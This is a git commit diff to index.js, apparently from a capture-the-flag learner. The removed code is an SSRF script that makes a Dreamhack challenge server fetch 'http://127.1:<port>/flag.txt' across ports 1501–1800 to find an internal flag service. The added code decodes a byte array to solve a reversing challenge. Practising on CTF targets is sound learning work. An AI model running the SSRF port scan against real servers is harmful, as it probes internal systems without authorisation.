c37f1421168235f3eeaf92e6f6fa5eb79b0d5d3d
jennyjunho2 <a01032208149@gmail.com>
2022-10-13 13:41:08 +0900

    221013

--- index.js
+++ index.js
@@ -1,17 +1,11 @@
-for (let port = 1501; port < 1801; port++) {
-  const data = new FormData();
-  data.append("url", `http://127.1:${port}/flag.txt`);
+// rev-basic-3
+const ans = [
+  0x49, 0x60, 0x67, 0x74, 0x63, 0x67, 0x42, 0x66, 0x80, 0x78, 0x69, 0x69, 0x7b,
+  0x99, 0x6d, 0x88, 0x68, 0x94, 0x9f, 0x8d, 0x4d, 0xa5, 0x9d, 0x45,
+];
 
-  fetch("http://host3.dreamhack.games:13283/img_viewer", {
-    method: "POST",
-    body: data,
-  })
-    .then((res) => {
-      return res.text();
-    })
-    .then((data) => {
-      if (data.length != 65121) {
-        console.log(port);
-      }
-    });
-}
+const newArr = ans.map((value, idx) => {
+  return (value - 2 * idx) ^ idx;
+});
+
+console.log(String.fromCharCode(...newArr));
